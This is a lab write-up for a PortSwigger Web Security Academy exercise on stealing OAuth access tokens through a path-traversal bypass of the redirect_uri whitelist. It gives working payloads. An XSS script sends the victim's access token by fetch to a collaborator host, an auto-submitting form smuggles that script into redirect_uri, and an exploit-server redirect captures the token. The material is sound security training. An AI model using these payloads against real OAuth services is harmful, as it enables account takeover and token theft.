# [Lab: Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## Lab

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

```text
Note
You cannot access the admin's API key by simply logging in to their account on the client application.
```

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

## Analysis

whitelist-based filter:

```regex
^https://id.web-security-academy.net/oauth-callback/
```

We can use `path traversal` to bypass the whitelist-based filter and exploit other vulnerabilities of the target.

## Solutions

Solution 1, exploit the xss vulnerability at `/post/comment/confirmation?postId=xss`

- payload:

  ```js
  <script>
    const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
    const token = urlSearchParams.get('access_token');
    fetch('https://collaboratorip',{
      method:'POST',
      mode: 'no-cors',
      body: token
    });
  </script>
  ```

- csrf-like attack:

  ```html
  <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
      <form action="https://oauth-id.web-security-academy.net/auth">
        <input type="hidden" name="client_id" value="ormdsztpqjms7ew7gfe49" />
        <input type="hidden" name="redirect_uri" value="https://id.web-security-academy.net/oauth-callback/../post/comment/confirmation?postId="></a><script>const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));const token = urlSearchParams.get('access_token');fetch('https://collaboratorip',{method:'POST',mode: 'no-cors',body: token});</script> />
        <input type="hidden" name="response_type" value="token" />
        <input type="hidden" name="nonce" value="1976118293" />
        <input type="hidden" name="scope" value="openid&#32;profile&#32;email" />
        <input type="submit" value="Submit request" />
      </form>
      <script>
        document.forms[0].submit();
      </script>
    </body>
  </html>
  ```

Solution 2, exploit the open redirect vulnerability:

  ```http
  GET /post/next?path=boom HTTP/1.1

  HTTP/1.1 302 Found
  Location: boom
  ```

- exploit-server:

  ```html
  <script>
      if (!document.location.hash) {
          window.location = 'https://oauth-id.web-security-academy.net/auth?client_id=kc79l1452vzad3jacaj3e&redirect_uri=https://id.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-id.exploit-server.net/exploit&response_type=token&nonce=995953865&scope=openid%20profile%20email'
      } else {
          window.location = '/?'+document.location.hash.substr(1)
      }
  </script>
  ```
